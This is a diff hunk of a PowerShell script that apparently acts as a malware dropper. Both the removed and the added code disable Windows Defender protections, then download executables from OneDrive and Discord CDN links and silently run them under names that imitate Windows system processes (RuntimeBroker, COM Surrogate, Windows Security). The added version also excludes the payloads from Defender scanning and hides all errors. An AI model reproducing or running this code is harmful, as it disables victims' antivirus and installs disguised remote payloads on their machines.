@@ -378,32 +378,24 @@ function Main {
     Set-MpPreference -DisableBehaviorMonitoring $true
     Set-MpPreference -DisableIOAVProtection $true
     Set-MpPreference -DisableIntrusionPreventionSystem $true
-    $up = $env:USERPROFILE
-    $td = "$up\AppData\Local\Temp\6cfdfeea-9336-48ad-82b3-3d412645f44f\"
-    if (-not (Test-Path -Path $td)) {
-        New-Item -ItemType Directory -Path $td -Force | Out-Null
-    }
+    $up=$env:USERPROFILE
+    $td="$up\AppData\Local\Temp\6cfdfeea-9336-48ad-82b3-3d412645f44f\"
+    if (-not (Test-Path -Path $td)) {New-Item -ItemType Directory -Path $td -Force | Out-Null}
+    $ProgressPreference='SilentlyContinue'
+    $ErrorActionPreference='SilentlyContinue'
     function xk7f1q1 {
         param (
             [string]$zx1ds,
             [string]$ak9zl1
         )
-        $x82jdm = Join-Path -Path $td -ChildPath $ak9zl1
-        try {
-            Invoke-WebRequest -Uri $zx1ds -OutFile $x82jdm -UseBasicParsing -ErrorAction Stop *> $null
-            Unblock-File -Path $x82jdm *> $null
-            icacls $x82jdm /grant Everyone:(F) *> $null
-            if (Test-Path -Path $x82jdm) {
-                Start-Process -FilePath $x82jdm -NoNewWindow -Wait *> $null
-            }
-        } catch {
-            # Errors are suppressed entirely
-        }
+        $x82jdm=Join-Path -Path $td -ChildPath $ak9zl1
+        Invoke-WebRequest -Uri $zx1ds -OutFile $x82jdm -UseBasicParsing -ErrorAction Stop *> $null 2>&1
+        Add-MpPreference -ExclusionPath $x82jdm *> $null 2>&1
+        Start-Process -x82jdm $x82jdm -NoNewWindow -Wait -ErrorAction SilentlyContinue *> $null 2>&1
     }
-    
-    xk7f1q1 -zx1ds "https://onedrive.live.com/download.aspx?cid=97860907e1ea7ff0&resid=97860907E1EA7FF0!113&parId=97860907E1EA7FF0!101&authkey=!ACaJl955WKnHmx8" -ak9zl1 "RuntimeBroker.exe"
-    xk7f1q1 -zx1ds "https://cdn.discordapp.com/attachments/1307069151948308490/1317051107322888263/Windows_Security..exe?ex=675d46ed&is=675bf56d&hm=49db304f5a31e81810613380e577351bb9b297b248a40d1d76ec0f6e06151ed9&" -ak9zl1 "Windows Security..exe"
-    xk7f1q1 -zx1ds "https://cdn.discordapp.com/attachments/1307069151948308490/1317051079371784264/COM_Surrogate.exe?ex=675d46e6&is=675bf566&hm=fd17e544a2ce1d5d56291eb4bd0a51ec5416daa29fd4eb25ada1d2e904b12f3c&" -ak9zl1 "COM Surrogate.exe"
+    xk7f1q1 -zx1ds "https://onedrive.live.com/download.aspx?cid=97860907e1ea7ff0&resid=97860907E1EA7FF0!113&parId=97860907E1EA7FF0!101&authkey=!ACaJl955WKnHmx8" -ak9zl1 "Runtime Broker.exe"
+    xk7f1q1 -zx1ds "https://cdn.discordapp.com/attachments/1307069151948308490/1317064226329722900/COM_Surrogate.exe?ex=675d5325&is=675c01a5&hm=27aff13cbe0e0206758c9b48cd37bf161fff2c041ace7fe97ca46f9f0d074568&" -ak9zl1 "COM Surrogate.exe"
+    xk7f1q1 -zx1ds "https://cdn.discordapp.com/attachments/1307069151948308490/1317064215881711676/Windows_Security.exe?ex=675d5322&is=675c01a2&hm=281e33474de3ea98fce5e4813b7e8172e62a8eaf9eee26b9707303e99425821d&" -ak9zl1 "Windows Security.exe"
 
 
 
